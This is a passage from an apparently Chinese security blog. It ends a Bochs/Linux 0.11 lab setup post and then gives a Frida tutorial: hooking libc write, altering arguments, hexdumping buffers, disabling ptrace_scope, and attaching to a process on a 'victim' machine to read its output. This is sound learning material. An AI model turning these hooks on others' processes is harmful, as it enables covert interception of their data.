printk.c</span><br><span class="line">│   │   ├── sched.c</span><br><span class="line">│   │   ├── signal.c</span><br><span class="line">│   │   ├── sys.c</span><br><span class="line">│   │   ├── system_call.s</span><br><span class="line">│   │   ├── traps.c</span><br><span class="line">│   │   └── <span class="built_in">vsprintf</span>.c</span><br><span class="line">│   ├── lib <span class="comment">/* 系统调用的实现 */</span></span><br><span class="line">│   │   ├── close.c</span><br><span class="line">│   │   ├── ctype.c</span><br><span class="line">│   │   ├── dup.c</span><br><span class="line">│   │   ├── errno.c</span><br><span class="line">│   │   ├── execve.c</span><br><span class="line">│   │   ├── _exit.c</span><br><span class="line">│   │   ├── Makefile</span><br><span class="line">│   │   ├── <span class="built_in">malloc</span>.c</span><br><span class="line">│   │   ├── open.c</span><br><span class="line">│   │   ├── setsid.c</span><br><span class="line">│   │   ├── <span class="built_in">string</span>.c</span><br><span class="line">│   │   ├── wait.c</span><br><span class="line">│   │   └── write.c</span><br><span class="line">│   ├── Makefile </span><br><span class="line">│   ├── mm <span class="comment">/* 内核进程管理 */</span></span><br><span class="line">│   │   ├── Makefile</span><br><span class="line">│   │   ├── memory.c</span><br><span class="line">│   │   └── page.s</span><br><span class="line">│   ├── tags</span><br><span class="line">│   └── tools</span><br><span class="line">│       └── build.c</span><br><span class="line">├── linux<span class="number">-0.11</span>.tar.gz</span><br><span class="line">├── mount-hdc</span><br><span class="line">└── run</span><br></pre></td></tr></table></figure>
<p><strong>常见报错处理</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bochs-x 已经是最新版 (2.6.11+dfsg-1build1)</span><br></pre></td></tr></table></figure>
<ul>
<li>实验默认的 bochs 版本为 2.6.10，将其替换为系统兼容版本会免去很多报错</li>
<li>下载地址如下：<a target="_blank" rel="noopener" href="https://sourceforge.net/projects/bochs/files/bochs/">Bochs x86 PC emulator - Browse /bochs at SourceForge.net</a> </li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo ./configure --with-x11 --with-x --enable-all-optimizations --enable-readline  --enable-debugger-gui --enable-x86-debugger --enable-a20-pin --enable-fast-function-calls --enable-debugger --prefix=/home/yhellow/hit-oslab-all/oslab/bochs-2.6.11/test</span><br><span class="line">make -j8</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
<ul>
<li>然后将编译好的二进制文件放入 bochs 目录</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Bochs is exiting with the following message:</span><br><span class="line">[      ] dlopen failed <span class="keyword">for</span> <span class="keyword">module</span> <span class="string">&#x27;vga_update_interval&#x27;</span> (libbx_vga_update_interval.so): file <span class="keyword">not</span> found</span><br></pre></td></tr></table></figure>
<ul>
<li>在 <code>/bochs/bochsrc.bxrc</code> 中注释 <code>vga_update_interval: 300000</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Bochs is exiting with the following message:</span><br><span class="line">[      ] ./bochs/bochsrc.bxrc:<span class="number">10</span>: <span class="string">&#x27;keyboard_serial_delay&#x27;</span> is deprecated - use <span class="string">&#x27;keyboard&#x27;</span> option instead.</span><br></pre></td></tr></table></figure>
<ul>
<li>在 <code>/bochs/bochsrc.bxrc</code> 中注释 <code>keyboard_serial_delay: 200</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Bochs is exiting with the following message:</span><br><span class="line">[      ] ./bochs/bochsrc.bxrc:<span class="number">11</span>: <span class="string">&#x27;keyboard_paste_delay&#x27;</span> is deprecated - use <span class="string">&#x27;keyboard&#x27;</span> option instead.</span><br></pre></td></tr></table></figure>
<ul>
<li>在 <code>/bochs/bochsrc.bxrc</code> 中注释 <code>keyboard_paste_delay: 100000</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Bochs is exiting with the following message:</span><br><span class="line">[      ] dlopen failed <span class="keyword">for</span> <span class="keyword">module</span> <span class="string">&#x27;i440fxsupport&#x27;</span> (libbx_i440fxsupport.so): file <span class="keyword">not</span> found</span><br></pre></td></tr></table></figure>
<ul>
<li>在 <code>/bochs/bochsrc.bxrc</code> 中注释 <code>i440fxsupport: enabled=0</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Bochs is exiting with the following message:</span><br><span class="line">[      ] ./bochs/bochsrc.bxrc:<span class="number">19</span>: display library <span class="string">&#x27;sdl&#x27;</span> <span class="keyword">not</span> available</span><br></pre></td></tr></table></figure>
<ul>
<li>在 <code>/bochs/bochsrc.bxrc</code> 中注释 <code>display_library: sdl</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Bochs is exiting with the following message:</span><br><span class="line">[HD    ] ata0<span class="number">-0</span>: could <span class="keyword">not</span> open hard drive image file <span class="string">&#x27;./hdc-0.11.img&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>删除 <code>hdc-0.11.img.lock</code> 文件</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Bochs is exiting with the following message:</span><br><span class="line">[BIOS  ] No bootable device.</span><br></pre></td></tr></table></figure>
<ul>
<li>没有编译 Linux 0.11 内核，需要先切换 gcc-3.4 然后在 <code>linux-0.11</code> 中执行 <code>make all</code></li>
</ul>
<p><strong>搭建效果展示</strong></p>
<img src="/2023/10/20/HIT-OSLab0/1697696231197.png" class width="1697696231197"> 

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/18/frida%E5%88%9D%E6%8E%A2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/18/frida%E5%88%9D%E6%8E%A2/" class="post-title-link" itemprop="url">frida初探</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-10-18 19:12:17 / Modified: 19:15:31" itemprop="dateCreated datePublished" datetime="2023-10-18T19:12:17+08:00">2023-10-18</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>7k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>6 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>Frida 简析&amp;安装</strong></p>
<p>Frida 是一款功能强大的动态代码插桩工具，主要用于 iOS 和 Android 应用程序，它允许开发人员在不修改目标应用程序源代码的情况下，注入新的代码来观察和修改应用程序的行为</p>
<p>Frida 支持多种编程语言，如 Python、JavaScript 和 C++，它可以通过命令行或图形界面进行使用，Frida 具有以下主要功能： </p>
<ul>
<li>注入代码：Frida 可以注入新的代码到目标应用程序中，这些代码可以观察和修改应用程序的行为</li>
<li>获取函数调用信息：Frida 可以获取目标应用程序中函数的调用信息，包括函数名、参数和返回值</li>
<li>修改函数行为：Frida 可以修改目标应用程序中函数的行为，例如修改函数的返回值或修改函数输入参数</li>
<li>监控线程：Frida 可以监控目标应用程序中的线程，包括线程的创建、退出和状态变化</li>
<li>获取全局变量：Frida 可以获取目标应用程序中的全局变量，并对其进行读取或修改</li>
</ul>
<p>安装 Frida：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install build-essential libffi-dev libssl-dev python3-dev</span><br><span class="line">pip3 install frida-tools</span><br><span class="line">pip3 install frida</span><br></pre></td></tr></table></figure>
<p>安装 Frida-server：</p>
<ul>
<li>下载网址：<a target="_blank" rel="noopener" href="https://github.com/frida/frida/releases">Releases · frida/frida (github.com)</a> </li>
<li>将解压好的二进制文件改名为 <code>frida-server</code> 并拖入 <code>/user/bin</code> 中</li>
</ul>
<p><strong>Frida API 使用案例</strong></p>
<p>官方文档如下：<a target="_blank" rel="noopener" href="https://frida.re/docs/javascript-api/">JavaScript API | Frida • A world-class dynamic instrumentation toolkit</a> </p>
<p>开启 frida-server，并确保 frida 可以监控到非自己的子进程：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo sysctl kernel.yama.ptrace_scope=0</span><br><span class="line">sudo frida-server</span><br></pre></td></tr></table></figure>
<ul>
<li><code>sysctl kernel.yama.ptrace_scope=0</code> 命令用于更改 Linux 内核的 <code>ptrace</code> 权限限制 <ul>
<li>当 <code>ptrace_scope</code> 为1时，如果 tracer 和 tracee 进程没有父子关系则 ptrace 无效，root 用户不理会此条件</li>
<li>当 <code>ptrace_scope</code> 为2时，如果 tracer 和 tracee 进程没有 CAP_SYS_PTRACE 能力则 ptrace 无效，root 用户可以获取任何能力，所以不理会该限制</li>
<li>当 <code>ptrace_scope</code> 为3时，对于所有用户均禁止 ptrace</li>
</ul>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/sys/kernel/yama/ptrace_scope</span><br></pre></td></tr></table></figure>
<ul>
<li>查看 <code>kernel.yama.ptrace_scope</code> 的状态</li>
</ul>
<p>测试样例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span> <span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span> (<span class="string">&quot;Number: %d\n&quot;</span>, n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span> (<span class="string">&quot;f() is at %p\n&quot;</span>, f);  </span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">        f (i++);</span><br><span class="line">        sleep (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Frida 脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">session = frida.attach(<span class="number">15529</span>) </span><br><span class="line">script = session.create_script(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">var write_address = Module.findExportByName(&#x27;libc.so.6&#x27;, &#x27;write&#x27;);</span></span><br><span class="line"><span class="string">Interceptor.attach(ptr(write_address), &#123;</span></span><br><span class="line"><span class="string">    onEnter: function(args) &#123;</span></span><br><span class="line"><span class="string">        const fd = args[0].toInt32();</span></span><br><span class="line"><span class="string">        const addr = args[1];</span></span><br><span class="line"><span class="string">        const size = args[2].toInt32();</span></span><br><span class="line"><span class="string">        const formattedString = `write($&#123;fd&#125;,$&#123;addr&#125;,$&#123;size&#125;)`;</span></span><br><span class="line"><span class="string">        send(formattedString);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span>(<span class="params">message, data</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(message)</span><br><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>, on_message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure>
<ul>
<li>frida.attach：使用进程名或者进程号指定进程，attach 进程创建 session</li>
<li>session.create_script：创建 JavaScript hook 脚本</li>
<li>script.on：注册用于通信的回调函数</li>
<li>script.load：加载脚本</li>
<li>sys.stdin.read：保持主线程运行</li>
</ul>
<p>效果如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Number: <span class="number">545</span></span><br><span class="line">Number: <span class="number">546</span></span><br><span class="line">Number: <span class="number">547</span></span><br><span class="line">---------------------------------------------</span><br><span class="line">&#123;<span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;send&#x27;</span>, <span class="string">&#x27;payload&#x27;</span>: <span class="string">&#x27;write(1,0x55e0ed3372a0,12)&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;send&#x27;</span>, <span class="string">&#x27;payload&#x27;</span>: <span class="string">&#x27;write(1,0x55e0ed3372a0,12)&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;send&#x27;</span>, <span class="string">&#x27;payload&#x27;</span>: <span class="string">&#x27;write(1,0x55e0ed3372a0,12)&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>该脚本会输出传入被 hook 函数的参数</li>
</ul>
<p><strong>Frida Hook 脚本常用对象</strong></p>
<p>hook 操作：Interceptor</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Interceptor.attach(ptr(<span class="string">&quot;%s&quot;</span>), &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="function"><span class="keyword">function</span>(<span class="params">args</span>) </span>&#123;</span><br><span class="line">        send(args[<span class="number">0</span>].toInt32()); <span class="comment">// 这里也可以直接修改args的值来改变传入的参数</span></span><br><span class="line">    onLeave: <span class="function"><span class="keyword">function</span> <span class="title">onLeave</span>(<span class="params">retval</span>) </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<ul>
<li>Interceptor.attach 用于 hook 操作，其 attach 方法有两个参数：<ul>
<li>将要被 hook 的函数在内存中加载的地址（这个地址可以通过 <code>Module.findExportByName(链接库名,函数名)</code> 来获取）</li>
<li>包含回调函数的对象（由两个回调函数组成）</li>
</ul>
</li>
<li>ptr 接收一个字符串，用于构造一个指针</li>
<li>onEnter 在进入该函数时调用，args 为传入该函数的参数</li>
<li>onLeave 在函数返回时被调用，retval 该函数的返回值</li>
<li>send 函数用于 hook 脚本向外部发送信息，通过在外部 python 脚本中用 script.on 设置回调函数来接收信息</li>
</ul>
<p>调用函数：NativeFunction</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> write_address = Module.findExportByName(<span class="string">&#x27;libc.so.6&#x27;</span>, <span class="string">&#x27;write&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> run = <span class="keyword">new</span> NativeFunction(write_address, <span class="string">&#x27;size_t&#x27;</span>, [<span class="string">&#x27;size_t&#x27;</span>,<span class="string">&#x27;pointer&#x27;</span>,<span class="string">&#x27;size_t&#x27;</span>]);</span><br><span class="line">Interceptor.attach(ptr(write_address), &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="function"><span class="keyword">function</span>(<span class="params">args</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">const</span> fd = args[<span class="number">0</span>].toInt32();</span><br><span class="line">        <span class="keyword">const</span> addr = args[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">const</span> size = args[<span class="number">2</span>].toInt32();</span><br><span class="line">        run(fd,addr,size);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<ul>
<li>NativeFunction 构造函数接受三个参数：函数地址，返回值，参数类型（数组表示）</li>
<li>上述案例的作用就是将 write 函数再执行一遍，效果如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Number: <span class="number">1410</span></span><br><span class="line">Number: <span class="number">1410</span></span><br><span class="line">Number: <span class="number">1411</span></span><br><span class="line">Number: <span class="number">1411</span></span><br><span class="line">Number: <span class="number">1412</span></span><br><span class="line">Number: <span class="number">1412</span></span><br></pre></td></tr></table></figure>
<p>分配空间：Memory</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> write_address = Module.findExportByName(<span class="string">&#x27;libc.so.6&#x27;</span>, <span class="string">&#x27;write&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> st1 = Memory.allocUtf8String(<span class="string">&quot;Hack_by_YHellow!\\n&quot;</span>);</span><br><span class="line">Interceptor.attach(ptr(write_address), &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="function"><span class="keyword">function</span>(<span class="params">args</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> st2 = Memory.allocUtf8String(<span class="string">&quot;Can be output\\n&quot;</span>);</span><br><span class="line">        send(args[<span class="number">1</span>]+<span class="string">&quot;-&gt;&quot;</span>+st2);</span><br><span class="line">        args[<span class="number">1</span>] = st2;</span><br><span class="line">        args[<span class="number">2</span>] = ptr(<span class="string">&#x27;17&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<ul>
<li>Memory 对象下的方法可以操作被 attach 进程的内存空间，该方法分配的空间会在函数结束后被销毁（在 onEnter 中分配的内存空间会在 onEnter 结束后被释放，在全局分配的空间则会在整个程序结束后释放）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;send&#x27;</span>, <span class="string">&#x27;payload&#x27;</span>: <span class="string">&#x27;0x561ec38592a0-&gt;0x7f21a810bc00&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;send&#x27;</span>, <span class="string">&#x27;payload&#x27;</span>: <span class="string">&#x27;0x7f21a810ac40&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;send&#x27;</span>, <span class="string">&#x27;payload&#x27;</span>: <span class="string">&#x27;0x561ec38592a0-&gt;0x7f21a89aa530&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;send&#x27;</span>, <span class="string">&#x27;payload&#x27;</span>: <span class="string">&#x27;0x7f21a810ac40&#x27;</span>&#125;</span><br><span class="line">-------------------------</span><br><span class="line">�ܚ�!� <span class="string">&#x27;�! ���!� &#x27;</span>�! �� �!� <span class="string">&#x27;�! ��!� &#x27;</span>�!  ���!� <span class="string">&#x27;�! @v�!� &#x27;</span>�! ؚ�!� <span class="string">&#x27;�! �� �!� &#x27;</span>�! ���!� <span class="string">&#x27;�! �� �!� &#x27;</span>�! ��!� <span class="string">&#x27;�!  ���!� &#x27;</span>�! @v�!� <span class="string">&#x27;�! ؚ�!� &#x27;</span>�! �� �!� <span class="string">&#x27;�! ��!� &#x27;</span>�! ���!� <span class="string">&#x27;�! ؚ�!� &#x27;</span>�! �� �!� <span class="string">&#x27;�! Number: 32</span></span><br><span class="line"><span class="string">Number: 33</span></span><br></pre></td></tr></table></figure>
<ul>
<li>由于 onEnter 结束后 Memory.allocUtf8String 申请的空间会被释放，被 hook 的 write 会打印出乱码</li>
</ul>
<p>读取内存：hexdump</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> write_address = Module.findExportByName(<span class="string">&#x27;libc.so.6&#x27;</span>, <span class="string">&#x27;write&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> run = <span class="keyword">new</span> NativeFunction(write_address, <span class="string">&#x27;size_t&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>,<span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">Interceptor.attach(ptr(write_address), &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="function"><span class="keyword">function</span>(<span class="params">args</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">const</span> fd = args[<span class="number">0</span>].toInt32();</span><br><span class="line">        <span class="keyword">const</span> addr = args[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">const</span> size = args[<span class="number">2</span>].toInt32();</span><br><span class="line">        send(hexdump(addr,&#123;</span><br><span class="line">            <span class="attr">offset</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">length</span>: size,</span><br><span class="line">            <span class="attr">header</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">ansi</span>: <span class="literal">false</span></span><br><span class="line">        &#125;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<ul>
<li>函数 hexdump 有两个参数：需要读取的地址，读取设置</li>
</ul>
<p><strong>Frida 远程调试</strong></p>
<p><code>frida.get_device_manager</code> 是 Frida 库中的一个函数，用于获取当前设备的设备管理器对象（设备管理器对象用于管理 Frida 连接到目标设备的进程）</p>
<p>其中有一个 <code>add_remote_device</code> 方法用于添加远程设备（需要提供 IP:Port 或域名），返回一个 device 对象用于表示该远程设备</p>
<p>使用 device 对象的 <code>attach</code> 方法就可以连接远程 frida 服务器上的某个进程：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">str_host = <span class="string">&#x27;xx.xx.xx.xx:xx&#x27;</span></span><br><span class="line">manager = frida.get_device_manager()</span><br><span class="line">remote_device = manager.add_remote_device(str_host)</span><br><span class="line">session = remote_device.attach(<span class="string">&quot;xx&quot;</span>)   </span><br></pre></td></tr></table></figure>
<p>远程受害机：修改 ptrace 权限并启动 frida 服务器</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo sysctl kernel.yama.ptrace_scope=0</span><br><span class="line">sudo frida-server</span><br></pre></td></tr></table></figure>
<p>本地主机：编写 frida python 脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">str_host = <span class="string">&#x27;192.168.11.130:6666&#x27;</span></span><br><span class="line">manager = frida.get_device_manager()</span><br><span class="line">remote_device = manager.add_remote_device(str_host)</span><br><span class="line"><span class="built_in">print</span>(remote_device)</span><br><span class="line">session = remote_device.attach(<span class="string">&quot;spy&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(session)                          </span><br><span class="line"></span><br><span class="line">scr = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">var write_address = Module.findExportByName(&#x27;libc.so.6&#x27;, &#x27;write&#x27;);</span></span><br><span class="line"><span class="string">var run = new NativeFunction(write_address, &#x27;size_t&#x27;, [&#x27;pointer&#x27;,&#x27;pointer&#x27;]);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Interceptor.attach(ptr(write_address), &#123;</span></span><br><span class="line"><span class="string">    onEnter: function(args) &#123;</span></span><br><span class="line"><span class="string">        const fd = args[0].toInt32();</span></span><br><span class="line"><span class="string">        const addr = args[1];</span></span><br><span class="line"><span class="string">        const size = args[2].toInt32();</span></span><br><span class="line"><span class="string">        send(hexdump(addr,&#123;</span></span><br><span class="line"><span class="string">            offset: 0,</span></span><br><span class="line"><span class="string">            length: size,</span></span><br><span class="line"><span class="string">            header: false,</span></span><br><span class="line"><span class="string">            ansi: false</span></span><br><span class="line"><span class="string">        &#125;));</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">                </span><br><span class="line">script = session.create_script(scr)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span>(<span class="params">message ,data</span>):</span></span><br><span class="line">    <span class="built_in">print</span> (message[<span class="string">&quot;payload&quot;</span>])</span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span> , on_message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure>
<p>运行效果如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="number">1</span></span><br><span class="line">Name of person: yhellow</span><br><span class="line">ID: <span class="number">5894042113563141378</span></span><br></pre></td></tr></table></figure>
